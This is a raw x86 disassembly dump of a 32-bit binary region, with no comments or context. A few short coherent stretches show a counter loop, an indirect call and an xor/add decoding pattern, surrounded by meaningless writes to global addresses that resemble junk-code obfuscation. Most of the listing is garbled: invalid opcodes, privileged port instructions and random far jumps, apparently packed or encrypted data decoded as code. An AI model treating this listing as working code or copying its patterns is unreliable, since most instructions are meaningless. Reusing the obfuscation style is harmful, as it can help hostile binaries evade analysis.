  4072ca:	icebp  
  4072cb:	aas    
  4072cc:	xchg   edx,eax
  4072cd:	cdq    
  4072ce:	inc    ebx
  4072cf:	std    
  4072d0:	xor    al,0xb9
  4072d2:	push   edi
  4072d3:	push   es
  4072d4:	push   edx
  4072d5:	out    0x1e,al
  4072d7:	jl     0x4072a6
  4072d9:	sbb    eax,0x8f747911
  4072de:	jo     0x4072aa
  4072e0:	jl     0x407351
  4072e2:	inc    esi
  4072e3:	add    BYTE PTR [ecx+0x4945dbc1],0xb
  4072ea:	xchg   edx,eax
  4072eb:	mov    ch,0x7b
  4072ed:	mov    eax,0xd4df2270
  4072f2:	xchg   DWORD PTR [edx+0x37],edx
  4072f5:	add    BYTE PTR ds:0xe7e30512,cl
  4072fb:	xchg   BYTE PTR [edi+0x5e],ah
  4072fe:	or     al,0x70
  407300:	jmp    0x1307:0xa8f6b88f
  407307:	in     al,dx
  407308:	les    esp,FWORD PTR [ebp-0x7b7ef924]
  40730e:	dec    eax
  40730f:	push   0xf903ba20
  407314:	push   edi
  407315:	clc    
  407316:	mov    ecx,0xa5efed4a
  40731b:	loope  0x407355
  40731d:	scas   al,BYTE PTR es:[edi]
  40731e:	mov    BYTE PTR [ecx+ecx*1],bl
  407321:	imul   eax,DWORD PTR [ecx+0x3dcf4882],0x43396522
  40732b:	or     esp,eax
  40732d:	lods   al,BYTE PTR ds:[esi]
  40732e:	or     eax,0xb6d233f3
  407333:	imul   ecx,DWORD PTR ds:0x5090e70b,0xfffffff4
  40733a:	dec    esi
  40733b:	fs dec ebx
  40733d:	pop    ss
  40733e:	cmp    BYTE PTR [eax],dl
  407340:	and    ah,bl
  407342:	shr    BYTE PTR ss:[edi+0x63],1
  407346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407347:	mov    eax,DWORD PTR [ebp-0xc]
  40734a:	add    DWORD PTR ds:0x42fcd1,0x42e703
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fcfd,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e70f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fcfd,0x0
  407384:	mov    eax,ds:0x42fcfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fcfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fcfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e45f
  4073a2:	cmp    DWORD PTR ds:0x42fcfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fcfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fcfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fcfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e128,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e707,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	(bad)  
  4073fc:	xlat   BYTE PTR ds:[ebx]
  4073fd:	(bad)  
  4073fe:	adc    esi,edi
  407400:	iret   
  407401:	jo     0x407473
  407403:	and    BYTE PTR [ebp+0x70],bh
  407406:	jo     0x40742f
  407408:	scas   al,BYTE PTR es:[edi]
  407409:	pop    ebx
  40740a:	std    
  40740b:	leave  
  40740c:	add    BYTE PTR ds:[esi+ebx*2-0x792e5a68],cl
  407414:	jb     0x4073da
  407416:	xor    eax,0x4a2fde51
  40741b:	push   ecx
  40741c:	cmp    bh,BYTE PTR [esi-0x658ce0a7]
  407422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407424:	sahf   
  407425:	rol    edi,1
  407427:	gs pop es
  407429:	or     eax,0xdd0f8544
  40742e:	shr    esp,1
  407430:	push   ss
  407431:	out    0x88,al
  407433:	adc    edx,edi
  407435:	icebp  
  407436:	or     al,ah
  407438:	std    
  407439:	mov    bp,0x461f
  40743d:	das    
  40743e:	sbb    eax,DWORD PTR [ebp+eiz*2+0x1c34e841]
  407445:	out    0x81,eax
  407447:	pop    esi
  407448:	je     0x407497
  40744a:	pop    edx
  40744b:	sub    BYTE PTR [eax-0x77e6ff88],al
  407451:	push   edi
  407452:	mov    ds:0x2da45f2f,al
  407457:	(bad)  
  407458:	scas   al,BYTE PTR es:[edi]
  407459:	sub    esi,DWORD PTR [edx]
  40745b:	xchg   ebx,eax
  40745c:	fwait
  40745d:	mov    gs,WORD PTR [eax+esi*2]
  407460:	pop    ds
  407461:	sub    edx,DWORD PTR [ecx+edi*8]
  407464:	inc    ebp
  407465:	lds    esp,FWORD PTR ds:[edi-0x4e]
  407469:	hlt    
  40746a:	jecxz  0x4074b6
  40746c:	(bad)  
  40746d:	out    dx,eax
  40746e:	jecxz  0x4074ae
  407470:	jl     0x407461
  407472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407473:	mov    al,ds:0x500ecd04
  407478:	rcl    BYTE PTR [edx-0x26],0xc
  40747c:	cmp    ecx,eax
  40747e:	inc    esp
  40747f:	adc    edi,DWORD PTR [ecx]
  407481:	icebp  
  407482:	mov    ch,0x5f
  407484:	jmp    0x3301:0xf4317a7b
  40748b:	(bad)  
  40748c:	mov    bh,0x6e
  40748e:	outs   dx,DWORD PTR ds:[esi]
  40748f:	inc    edx
  407490:	sub    ch,BYTE PTR [edx+edx*2+0x1f151bb9]
  407497:	int3   
  407498:	and    bl,BYTE PTR [ecx+0x78b3175f]
  40749e:	call   0xcb35:0xd6a2739d
  4074a5:	dec    eax
  4074a6:	hlt    
  4074a7:	fwait
  4074a8:	dec    eax
  4074a9:	and    bh,BYTE PTR [edx]
  4074ab:	jno    0x407474
  4074ad:	js     0x4074f1
  4074af:	cmp    BYTE PTR cs:[esi],0xdc
  4074b3:	aam    0xa3
  4074b5:	popa   
  4074b6:	xor    eax,0xf79728e4
  4074bb:	fdivrp st(2),st
  4074bd:	mov    dl,0xec
  4074bf:	or     edx,DWORD PTR [ebp+ebp*4-0x7af935d2]
  4074c6:	in     al,0x69
  4074c8:	(bad)  
  4074c9:	in     al,0x34
  4074cb:	sahf   
  4074cc:	clc    
  4074cd:	or     dh,BYTE PTR [edi-0x5b]
  4074d0:	push   edi
  4074d1:	push   esp
  4074d2:	in     al,0x48
  4074d4:	cmp    ch,bh
  4074d6:	fucomi st,st(3)
  4074d8:	mov    WORD PTR [edi],es
  4074da:	sbb    DWORD PTR gs:[ecx-0x3f],ebp
  4074de:	dec    eax
  4074df:	jbe    0x407501
  4074e1:	pushf  
  4074e2:	ss and eax,0xcb680e81
  4074e8:	sbb    eax,0x12f1ca69
  4074ed:	pop    edi
  4074ee:	sbb    bl,BYTE PTR ds:0x8a6b80ad
  4074f4:	add    esi,edx
  4074f6:	inc    ebx
  4074f7:	mov    edx,0x8bd85c56
  4074fc:	ficom  WORD PTR [edx]
  4074fe:	jno    0x407489
  407500:	jmp    0x407519
  407502:	xlat   BYTE PTR ds:[ebx]
  407503:	fidivr WORD PTR [esi+eax*1-0x51]
  407507:	inc    eax
  407508:	xchg   DWORD PTR [esi],ecx
  40750a:	sar    dh,1
  40750c:	adc    DWORD PTR [edx-0x73],edx
  40750f:	xchg   ebp,eax
  407510:	inc    esp
  407511:	nop
  407512:	inc    DWORD PTR [ebx+0x19daf945]
  407518:	leave  
  407519:	pop    ecx
  40751a:	mov    edx,DWORD PTR [ecx+0xc1c2abe]
  407520:	add    ch,BYTE PTR [ebx+0x7a2fa373]
  407526:	mov    esi,0x6ebc10b9
  40752b:	into   
  40752c:	push   0x54bbab57
  407531:	and    al,0xea
  407533:	push   es
  407534:	jmp    0xc63e035e
  407539:	dec    edi
  40753a:	outs   dx,DWORD PTR ds:[esi]
  40753b:	cmp    edx,ebx
  40753d:	inc    esp
  40753e:	adc    eax,0x2000766a
  407543:	hlt    
  407544:	sbb    DWORD PTR [edi],esp
  407546:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407547:	clc    
  407548:	arpl   WORD PTR gs:[ecx-0x13401238],cx
  40754f:	das    
  407550:	inc    edx
  407551:	bound  ecx,QWORD PTR [ebp-0x506dc300]
  407557:	and    eax,0x2d87975f
  40755c:	mov    esp,0x9a517055
  407561:	or     edi,ecx
  407563:	or     DWORD PTR [eax],ebx
  407565:	and    eax,DWORD PTR ds:0xff79d24b
  40756b:	xchg   ebp,eax
  40756c:	ja     0x4075ce
  40756e:	cmp    DWORD PTR [edx-0x30589d70],edx
  407574:	aad    0x42
  407576:	xor    al,0x65
  407578:	mov    al,0x3a
  40757a:	pop    ss
  40757b:	and    BYTE PTR [edx+0x2a8dbe2e],ah
  407581:	pop    esp
  407582:	ja     0x407599
  407584:	or     cl,dh
  407586:	in     al,dx
  407587:	jo     0x407538
  407589:	hlt    
  40758a:	push   cs
  40758b:	adc    edx,DWORD PTR [edx+0x52c4a843]
  407591:	adc    DWORD PTR [ebx],edx
  407593:	pop    ss
  407594:	ja     0x4075a1
  407596:	adc    dh,dh
  407598:	jae    0x407542
  40759a:	clc    
  40759b:	fmul   DWORD PTR [esi+eiz*4+0x4c]
  40759f:	scas   eax,DWORD PTR es:[edi]
  4075a0:	popf   
  4075a1:	stos   DWORD PTR es:[edi],eax
  4075a2:	scas   al,BYTE PTR es:[edi]
  4075a3:	(bad)  
  4075a4:	dec    edx
  4075a5:	or     eax,0x8463c121
  4075aa:	add    edi,0x5f42ae98
  4075b0:	call   0x8128e56
  4075b5:	cdq    
  4075b6:	shl    esi,1
  4075b8:	and    BYTE PTR [ecx-0x8276632],bh
  4075be:	ins    BYTE PTR es:[edi],dx
  4075bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075c0:	daa    
  4075c1:	jmp    0x4075e3
  4075c3:	or     dl,BYTE PTR [eax-0x1]
  4075c6:	pop    ebx
  4075c7:	xchg   edx,eax
  4075c8:	or     BYTE PTR [eax],al
  4075ca:	loop   0x407601
  4075cc:	(bad)  
  4075ce:	mov    BYTE PTR [edi-0x6a],al
  4075d1:	gs mov ah,0xa7
  4075d4:	adc    dl,bl
  4075d6:	jns    0x407638
  4075d8:	mov    eax,ds:0xa03f64a0
  4075dd:	out    0x48,eax
  4075df:	and    dl,cl
  4075e1:	arpl   sp,cx
  4075e3:	loopne 0x40765b
  4075e5:	enter  0x1807,0x41
  4075e9:	and    BYTE PTR [ebx+0x19db0aea],cl
  4075ef:	test   al,0xf9
  4075f1:	mov    ch,0xe3
  4075f3:	sbb    al,0x1a
  4075f5:	aad    0xec
  4075f7:	je     0x4075f1
  4075f9:	(bad)  
  4075fa:	or     BYTE PTR [ebx],bl
  4075fc:	mov    ds:0x5c2c5d75,al
  407601:	dec    ebp
  407602:	xchg   BYTE PTR [edi],al
  407604:	or     bh,bl
  407606:	jp     0x407598
  407608:	fadd   QWORD PTR ds:0xc0ecd4eb
  40760e:	pop    ss
  40760f:	xchg   edx,eax
  407610:	mov    dl,0x65
  407612:	ror    DWORD PTR [esi-0xb],1
  407615:	in     al,dx
  407616:	out    0x40,al
  407618:	mov    dl,0x1e
  40761a:	add    ecx,edx
  40761c:	jnp    0x407615
  40761e:	(bad)  
  40761f:	adc    bl,BYTE PTR [eax-0x50f4cbbe]
  407625:	ret    0x965e
  407628:	(bad)  
  407629:	jmp    0x430a4f66
  40762e:	jmp    0x4075e9
  407630:	xlat   BYTE PTR ds:[ebx]
  407631:	test   eax,0xd64df487
  407636:	push   cs
  407637:	ja     0x407645
  407639:	pop    ebx
  40763a:	(bad)  
  40763b:	push   edi
  40763c:	stos   BYTE PTR es:[edi],al
  40763d:	or     ebp,DWORD PTR [edi]
  40763f:	jmp    0xc529:0x44e95e4b
  407646:	loopne 0x40761e
  407648:	dec    edi
  407649:	clc    
  40764a:	xchg   BYTE PTR ds:0x9a30389d,al
  407650:	or     DWORD PTR [eax+esi*8+0x137320af],ebp
  407657:	pop    es
  407658:	or     DWORD PTR [ebx+eiz*1],ebx
  40765b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40765c:	xor    DWORD PTR [edx+edi*2+0x4b57a85d],ebx
  407663:	ret    0xb7a
  407666:	ret    0xfc8
  407669:	xchg   esi,eax
  40766a:	mov    esp,0x38d8b930
  40766f:	sti    
  407670:	popf   
  407671:	adc    ecx,DWORD PTR [edx+eax*2-0x4fa6407a]
  407678:	call   0xb77e:0x963c7996
  40767f:	lahf   
  407680:	loopne 0x407633
  407682:	les    ecx,FWORD PTR [ecx+edx*8+0x33]
  407686:	(bad)  
  407687:	lods   eax,DWORD PTR ds:[esi]
  407688:	pop    edi
  407689:	out    dx,eax
  40768a:	pop    esp
  40768b:	or     eax,0xbee98aaf
  407690:	pop    ecx
  407691:	scas   eax,DWORD PTR es:[edi]
  407692:	mov    dl,0x15
  407694:	xchg   edx,eax
  407695:	ja     0x4076d3
  407697:	pop    esi
  407698:	or     DWORD PTR [ecx],0xb
  40769b:	outs   dx,DWORD PTR ds:[esi]
  40769c:	stos   BYTE PTR es:[edi],al
  40769d:	push   edi
  40769e:	pop    ds
  40769f:	out    dx,al
  4076a0:	pop    ebp
  4076a1:	jle    0x4076c5
  4076a3:	cmp    DWORD PTR [edi+edi*1],ecx
  4076a6:	sub    cl,BYTE PTR [edx]
  4076a8:	in     al,0x96
  4076aa:	push   0x72
  4076ac:	jmp    0x4076b6
  4076ae:	aam    0xa0
  4076b0:	jne    0x40764b
  4076b2:	and    ebp,esi
  4076b4:	es xor al,al
  4076b7:	test   BYTE PTR [ebx-0x45c997a2],ah
  4076bd:	arpl   WORD PTR [ecx-0x5a6fbf20],si
  4076c3:	cmc    
  4076c4:	or     al,0xbb
  4076c6:	sub    esp,DWORD PTR [edi]
  4076c8:	ficomp DWORD PTR [edx-0x4b5ec03a]
  4076ce:	inc    ebx
  4076cf:	test   BYTE PTR [edi+0x3d64c918],cl
  4076d5:	add    ch,BYTE PTR [eax+edx*4]
  4076d8:	lods   al,BYTE PTR ds:[esi]
  4076d9:	cmp    DWORD PTR [eax-0x46],ebx
  4076dc:	in     al,0x91
  4076de:	mov    ah,0x4c
  4076e0:	fisttp QWORD PTR ds:0x795fb307
  4076e6:	je     0x407745
  4076e8:	mov    cl,0x3e
  4076ea:	call   0xaaea:0xb40e2908
  4076f1:	into   
  4076f2:	ins    DWORD PTR es:[edi],dx
  4076f3:	adc    eax,DWORD PTR [ecx-0x1b]
  4076f6:	fst    DWORD PTR [ecx]
  4076f8:	leave  
  4076f9:	sub    DWORD PTR [ebp-0x4a],ecx
  4076fc:	aaa    
  4076fd:	xchg   esi,eax
  4076fe:	mov    esp,ebp
  407700:	out    0x96,al
  407702:	fs cmp eax,0x7d1d3a5c
  407708:	push   ds
  407709:	stc    
  40770a:	mov    ebx,0x8924eae4
  40770f:	clc    
  407710:	mov    BYTE PTR [edx+0x3923b8b],bl
  407716:	cmp    edi,esi
  407718:	xchg   ebx,eax
  407719:	jmp    0x407794
  40771b:	rcl    BYTE PTR [eax-0x5087d273],1
  407721:	pusha  
  407722:	pop    eax
  407723:	mov    esp,0xb590ac90
  407728:	aad    0x81
  40772a:	popa   
  40772b:	push   ss
  40772c:	dec    ecx
  40772d:	inc    edx
  40772e:	rcl    BYTE PTR [edx-0x71],1
  407731:	and    eax,0x9b0b2daa
  407737:	mov    eax,DWORD PTR [ebp-0x24]
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e11c,0x42fd09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fcd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e6ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fcf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e70f,0x42e6eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e6ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e703,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fce5,0x42fd6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	mov    ds:0xa7ff5639,eax
  4077de:	int3   
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x407797
  4077e6:	inc    ebx
  4077e7:	repnz (bad) 
  4077e9:	fsub   QWORD PTR [ecx-0x29]
  4077ec:	mov    cl,0x56
  4077ee:	add    ch,BYTE PTR [ebp+eax*1-0x16]
  4077f2:	lahf   
  4077f3:	pop    edi
  4077f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f5:	pop    ebp
  4077f6:	sbb    BYTE PTR [ebp+0x55],ch
  4077f9:	xor    edx,ecx
  4077fb:	fucom  st(0)
  4077fd:	hlt    
  4077fe:	push   edx
  4077ff:	push   ebx
  407800:	mov    fs,WORD PTR [ebp-0x7a]
  407803:	out    0xc0,al
  407805:	out    dx,al
  407806:	(bad)  
  407807:	repz sti 
  407809:	test   DWORD PTR [edi-0xb],0xaf4a5a9f
  407810:	jns    0x407889
  407812:	mov    DWORD PTR ds:0xf7e3c099,edi
  407818:	imul   ecx,DWORD PTR [edi+0x6b],0x87e0efc1
  40781f:	xchg   esp,eax
  407820:	loope  0x407824
  407822:	test   BYTE PTR [edx],ch
  407824:	call   0x2a753e92
  407829:	jno    0x407883
  40782b:	pop    ebp
  40782c:	xlat   BYTE PTR ds:[ebx]
  40782d:	inc    esi
  40782e:	push   0xffffff94
  407830:	aad    0x48
  407832:	and    esi,edx
  407834:	xor    ebx,DWORD PTR [ebx-0x7dd6b418]
  40783a:	add    bh,bl
  40783c:	les    ebp,FWORD PTR [edi-0x51414d0f]
  407842:	div    DWORD PTR [edi-0x117a3fb]
  407848:	push   ebx
  407849:	in     eax,dx
  40784a:	popf   
  40784b:	pop    ss
  40784c:	in     al,dx
  40784d:	pop    edi
  40784e:	pop    edi
  40784f:	enter  0x44ee,0xd6
  407853:	fcomi  st,st(0)
  407855:	pop    ecx
  407856:	lock mov ebx,0xbfa5786e
  40785c:	push   0xffffff86
  40785e:	pop    ebp
  40785f:	add    edx,edi
  407861:	aas    
  407862:	jne    0x407893
  407864:	xor    esi,esi
  407866:	cmp    al,0xb3
  407868:	popa   
  407869:	frstor [ebp+esi*1+0x17]
  40786d:	aas    
  40786e:	xor    dh,cl
  407870:	sub    BYTE PTR [eax+0x3a],dh
  407873:	repnz aas 
  407875:	adc    al,0x18
  407877:	mov    DWORD PTR gs:[ecx-0x24],eax
  40787b:	data16 (bad) 
  40787d:	sub    edi,edi
  40787f:	ins    DWORD PTR es:[edi],dx
  407880:	mov    es,WORD PTR [eax-0xb]
  407883:	sub    DWORD PTR [ebx-0x16],edi
  407886:	jo     0x4078bb
  407888:	push   cs
  407889:	inc    ebx
  40788a:	aas    
  40788b:	sbb    edx,DWORD PTR [esi-0x3e]
  40788e:	stc    
  40788f:	cmp    bh,BYTE PTR [ecx]
  407891:	cdq    
  407892:	loopne 0x407816
  407894:	test   BYTE PTR [ebp-0x14598376],dl
  40789a:	mov    fs,WORD PTR [ecx]
  40789c:	aam    0x41
  40789e:	psubusw mm4,QWORD PTR [ebp-0x3c586c6]
  4078a5:	rol    BYTE PTR [esi],cl
  4078a7:	and    DWORD PTR [esi],esp
  4078a9:	xchg   esp,eax
  4078aa:	mov    ebx,0x65a0bdfd
  4078af:	js     0x4078e6
  4078b1:	shl    DWORD PTR [ecx],0x7d
  4078b4:	and    eax,0xe014e0f2
  4078b9:	and    BYTE PTR [ecx+0xaa2c5ae],dl
  4078bf:	fstp   TBYTE PTR [ebx]
  4078c1:	inc    edx
  4078c2:	sub    al,ch
  4078c4:	or     bl,dh
  4078c6:	aaa    
  4078c7:	cld    
  4078c8:	and    dl,dl
  4078ca:	js     0x40786b
  4078cc:	scas   al,BYTE PTR es:[edi]
  4078cd:	xchg   ebp,eax
  4078ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078cf:	sub    eax,0x4abd3ae
  4078d4:	sbb    al,0x5c
  4078d6:	dec    ebp
  4078d7:	or     al,0xea
  4078d9:	or     al,BYTE PTR [ebx-0xb]
  4078dc:	pop    ss
  4078dd:	xchg   ecx,eax
  4078de:	or     bl,BYTE PTR [edi+0x4ca55199]
  4078e4:	mov    bl,ah
  4078e6:	(bad)  
  4078e7:	pop    ss
  4078e8:	scas   eax,DWORD PTR es:[edi]
  4078e9:	psrad  mm6,mm3
  4078ec:	mov    edi,0x516d8ed5
  4078f1:	test   BYTE PTR [edi+0x5b740278],cl
  4078f7:	ret    
  4078f8:	dec    edi
  4078f9:	mov    ch,BYTE PTR [esp+edi*2+0x6b976356]
  407900:	jns    0x407981
  407902:	(bad)  [ebx]
  407904:	ja     0x407958
  407906:	jno    0x4078ee
  407908:	sbb    DWORD PTR [esi+0x48],esp
  40790b:	(bad)  
  40790c:	jo     0x40796f
  40790e:	and    dh,BYTE PTR [ecx+esi*8-0x391573e5]
  407915:	xor    edx,eax
  407917:	fcmovbe st,st(6)
  407919:	fldcw  WORD PTR [edi+esi*2+0x5f]
  40791d:	xor    eax,0xb92cb30f
  407922:	std    
  407923:	ficom  DWORD PTR [esi-0x2f4375b]
  407929:	repz jmp 0x5537:0x991d2602
  407931:	mov    cl,0xa7
  407933:	hlt    
  407934:	xchg   esp,eax
  407935:	inc    esi
  407936:	push   es
  407937:	inc    esi
  407938:	ret    0xf8b6
  40793b:	mov    ds,WORD PTR [ebx+0x9db3927]
  407941:	cmp    al,0x8b
  407943:	imul   edx,DWORD PTR [ebx],0x699ad344
  407949:	xchg   edi,eax
  40794a:	aam    0x61
  40794c:	xchg   esp,eax
  40794d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40794e:	cli    
  40794f:	arpl   WORD PTR [eax-0x8],bx
  407952:	sbb    eax,0xe5ba5902
  407957:	sbb    bl,BYTE PTR [ecx]
  407959:	pop    ebx
  40795a:	sbb    DWORD PTR ds:0xe3af0fc7,esi
  407960:	pop    ebx
  407961:	mov    edx,0x94c15e20
  407966:	pop    es
  407967:	inc    esp
  407968:	adc    eax,0xffd147ad
  40796d:	xchg   esp,eax
  40796e:	cmp    ebp,eax
  407970:	jnp    0x4079c2
  407972:	idiv   eax
  407974:	dec    esi
  407975:	ins    BYTE PTR es:[edi],dx
  407976:	pop    ss
  407977:	sub    eax,0x759797f1
  40797c:	imul   ecx,DWORD PTR [esi+edx*2+0x2d10dab2],0x819941e7
  407987:	mov    cl,0xc2
  407989:	jmp    0xf3d17bb4
  40798e:	cmc    
  40798f:	sub    DWORD PTR [ebx-0x3fe53794],eax
  407995:	fisttp WORD PTR [ecx+ecx*1-0x62046dcf]
  40799c:	int    0x37
  40799e:	ins    BYTE PTR es:[edi],dx
  40799f:	std    
  4079a0:	mov    bl,0x67
  4079a2:	ins    BYTE PTR es:[edi],dx
  4079a3:	sub    bh,BYTE PTR [edx+0x59]
  4079a6:	sub    BYTE PTR [eax-0x19],ah
  4079a9:	mov    dh,0x89
  4079ab:	icebp  
  4079ac:	push   edx
  4079ad:	bound  ebx,QWORD PTR [ebp+0x64]
  4079b0:	pop    ebp
  4079b1:	adc    ecx,0x8ef521ae
  4079b7:	jo     0x407972
  4079b9:	inc    edi
  4079ba:	js     0x407a3b
  4079bc:	pop    edx
  4079bd:	ja     0x40799b
  4079bf:	add    ch,cl
  4079c1:	mov    cl,0xbe
  4079c3:	or     edi,edi
  4079c5:	lock and ah,bh
  4079c8:	sub    DWORD PTR [edi+0x509ef264],0x3e8753d3
  4079d2:	test   BYTE PTR [ebx+ecx*2+0x7b],bl
  4079d6:	xchg   edi,eax
  4079d7:	outs   dx,DWORD PTR ds:[esi]
  4079d8:	shr    eax,cl
  4079da:	not    DWORD PTR [eax+0x24]
  4079dd:	and    ebp,DWORD PTR [edi]
  4079df:	xchg   edi,eax
  4079e0:	mov    al,ds:0x40e8500a
  4079e5:	mov    cl,0xaf
  4079e7:	push   eax
  4079e8:	jmp    0x9c45:0xa0d4bba3
  4079ef:	loopne 0x40799e
  4079f1:	aam    0x37
  4079f3:	in     al,dx
  4079f4:	mov    al,bl
  4079f6:	xor    DWORD PTR [esi-0x6455ca36],eax
  4079fc:	fwait
  4079fd:	push   ebp
  4079fe:	mov    ah,0x2c
  407a00:	inc    esi
  407a01:	daa    
  407a02:	dec    ecx
  407a03:	jb     0x4079be
  407a05:	pop    esp
  407a06:	xchg   edx,eax
  407a07:	loope  0x40798d
  407a09:	mov    ebp,DWORD PTR [ebx+ebp*8+0x2bba5a38]
  407a10:	and    BYTE PTR [ebp-0x19],ah
  407a13:	jecxz  0x407a12
  407a15:	inc    ecx
  407a16:	imul   edi,DWORD PTR ss:[eax],0x5d416054
  407a1d:	arpl   WORD PTR [edx+0x78fc40d0],dx
  407a23:	arpl   WORD PTR [ecx+edi*8],cx
  407a26:	aam    0x96
  407a28:	ret    
  407a29:	(bad)  
  407a2a:	std    
  407a2b:	stc    
  407a2c:	jle    0x407a4c
  407a2e:	adc    dl,BYTE PTR [edi-0x3c]
  407a31:	xchg   edx,eax
  407a32:	shl    DWORD PTR [edi-0x1bdf0556],1
  407a38:	int3   
  407a39:	mov    ds:0xa721dac3,al
  407a3e:	imul   edx,ecx,0xffffffaa
  407a41:	push   esi
  407a42:	sbb    dh,BYTE PTR [edx-0x24]
  407a45:	call   0xb2adcb1b
  407a4a:	jecxz  0x4079ed
  407a4c:	jl     0x407a9c
  407a4e:	cdq    
  407a4f:	or     BYTE PTR [ebx-0x17cc3f8f],al
  407a55:	and    DWORD PTR [esi-0x26],0xffffffc3
  407a59:	add    al,0x8b
  407a5b:	xchg   esi,eax
  407a5c:	pop    esp
  407a5d:	push   ds
  407a5e:	mov    edi,0x8b8cb064
  407a63:	lods   eax,DWORD PTR ds:[esi]
  407a64:	aaa    
  407a65:	or     bl,BYTE PTR [esi]
  407a67:	ins    DWORD PTR es:[edi],dx
  407a68:	push   eax
  407a69:	xor    cl,BYTE PTR [ebx]
  407a6b:	call   0x8c06:0xe66619d2
  407a72:	arpl   si,bp
  407a74:	add    esp,DWORD PTR [esp+ebp*1+0x31]
  407a78:	lods   al,BYTE PTR ds:[esi]
  407a79:	mov    ebp,0xb9b368a1
  407a7e:	popa   
  407a7f:	shl    ch,0xa8
  407a82:	imul   ebx,DWORD PTR [esi],0xb994d2cb
  407a88:	shl    BYTE PTR [ecx-0x5ad25768],0x63
  407a8f:	mov    ebx,0x5b57743c
  407a94:	xchg   ebx,eax
  407a95:	(bad)  
  407a96:	outs   dx,DWORD PTR ds:[esi]
  407a97:	icebp  
  407a98:	idiv   BYTE PTR [ebx]
  407a9a:	and    eax,0x6c93252d
  407a9f:	jno    0x407a95
  407aa1:	dec    edx
  407aa2:	jge    0x407af6
  407aa4:	repnz and ah,BYTE PTR [ecx-0x4c78f5a3]
  407aab:	iret   
  407aac:	mov    ds,WORD PTR [edx-0x3bb26804]
  407ab2:	mov    dh,0xfd
  407ab4:	popf   
  407ab5:	push   0xf366707c
  407aba:	popa   
  407abb:	mov    ebp,0xe1e0db14
  407ac0:	lock adc al,0xb5
  407ac3:	ss xor ebp,ebp
  407ac6:	stos   BYTE PTR es:[edi],al
  407ac7:	or     BYTE PTR [ecx],al
  407ac9:	and    eax,0x17d0064f
  407ace:	aam    0xb7
  407ad0:	pop    ds
  407ad1:	pop    ss
  407ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ad3:	add    eax,0x7f49a536
  407ad8:	sub    ch,al
  407ada:	pop    eax
  407adb:	in     eax,0x30
  407add:	push   ecx
  407ade:	gs add esp,eax
  407ae1:	adc    DWORD PTR [ecx+edi*4],esp
  407ae4:	mov    al,0xe7
  407ae6:	(bad)  
  407ae8:	out    0x96,eax
  407aea:	push   ecx
  407aeb:	dec    edx
  407aec:	(bad)  [ebx+0x6f01327b]
  407af2:	out    0x77,eax
  407af4:	lods   eax,DWORD PTR ds:[esi]
  407af5:	cdq    
  407af6:	mul    dl
  407af8:	outs   dx,DWORD PTR ds:[esi]
  407af9:	add    edi,DWORD PTR [edi-0x3]
  407afc:	(bad)  
  407afd:	mov    al,0x4d
  407aff:	mov    eax,ds:0x86bf068c
  407b04:	stc    
  407b05:	cdq    
